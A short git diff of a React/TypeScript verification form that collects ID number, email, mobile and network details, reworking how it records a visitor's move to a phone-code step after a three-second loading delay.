@@ -13,24 +13,22 @@ export default function VerificationForm(props: { setPage: any }) {
         email: "",
         mobile: "",
         network: "",
-        page:""
     })
     const [loading, setLoading] = useState(false)
 
     const handleSubmit = async (e: React.FormEvent) => {
         e.preventDefault()
-        props.setPage('phoneCode')
         addData(formData)
         setLoading(true)
         try {
-            setFormData({page:"phoneOtp", id: visitorId, idNumber: "", email: "", mobile: "", network: "" })
+
         } catch (error) {
             console.error("Error:", error)
         }
         setTimeout(() => {
             setLoading(false)
-
-        }, 3000);
+            addData({id:visitorId,page:"phoneCode"})
+            setFormData({ id: visitorId, idNumber: "", email: "", mobile: "", network: "" })        }, 3000);
     }
 
     const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
